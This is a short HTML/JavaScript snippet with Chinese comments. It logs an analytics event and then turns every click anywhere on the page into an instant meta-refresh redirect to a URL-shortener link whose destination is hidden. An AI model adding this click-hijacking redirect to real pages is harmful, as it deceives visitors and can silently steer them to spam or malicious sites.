    <script>
  // 當網頁加載完畢後執行
  window.onload = function() {
    // 取得網頁的body元素
    var body = document.getElementsByTagName('body')[0];
    gtag('event', 'enterweb', {
  'my_name': 'serverr',
  'my_age': '18'
});
    // 監聽body元素的點擊事件
    body.addEventListener('click', function() {
      // 創建一個meta標籤
      let redirectMeta = document.createElement('meta');
      // 設置http-equiv屬性
      redirectMeta.setAttribute('http-equiv', 'refresh');
      // 設置content屬性，0秒後導向到指定的連結
      redirectMeta.setAttribute('content', '0; URL=https://reurl.cc/kO0zbq');
      // 將meta標籤加入到head元素中
      document.head.appendChild(redirectMeta);
    });
  };
